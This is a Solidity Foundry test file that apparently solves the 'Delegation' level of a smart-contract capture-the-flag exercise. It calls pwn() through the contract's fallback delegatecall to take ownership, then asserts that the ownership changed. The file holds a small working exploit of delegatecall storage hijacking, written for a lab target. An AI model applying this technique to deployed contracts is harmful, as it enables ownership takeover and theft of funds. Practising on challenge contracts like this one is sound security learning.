// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

import { Delegation, Delegate } from "../../src/6/Delegation.sol";



contract DelegationTest is Test {

  Delegation public _delegation;
  Delegate public _delegate;

  address user = makeAddr('Rory');
  function setUp() public {
    _delegate = new Delegate(address(this));
    _delegation = new Delegation(address(_delegate));
  }

  function test_Delegation() public {
    console.log("Owner of Delegation1: ", _delegation.owner());
    vm.startPrank(user);
    
    bytes memory data = abi.encodeWithSignature("pwn()");
    (bool success, ) = address(_delegation).call(data);

    console.log("Delegatecall success: ", success);
    assert(success);

    console.log("Owner of Delegation2: ", _delegation.owner());

    assertEq(_delegation.owner(), user);
    vm.stopPrank();
  }

}